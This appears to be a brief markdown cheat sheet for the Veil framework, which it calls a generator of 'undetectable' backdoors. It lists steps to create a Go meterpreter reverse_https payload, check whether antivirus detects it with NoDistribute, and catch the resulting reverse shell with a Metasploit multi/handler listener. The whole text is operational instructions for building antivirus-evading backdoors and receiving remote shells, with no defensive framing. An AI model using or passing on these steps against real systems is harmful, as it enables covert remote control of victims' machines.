# VEIL

Veil is a framework for generating __undetectable__ backdoors.

## Creating demo payload

```
veil
> list > Evasion > list (see payloads)
> go/meterpreter/rev_https.py (example)
```

You can validate payload detection through _NoDistribute_ utility.

## Listening for connections with Metasploit

```
msfconsole
use exploit/multi/handler
show options
set PAYLOAD windows/meterpreter/reverse_https
```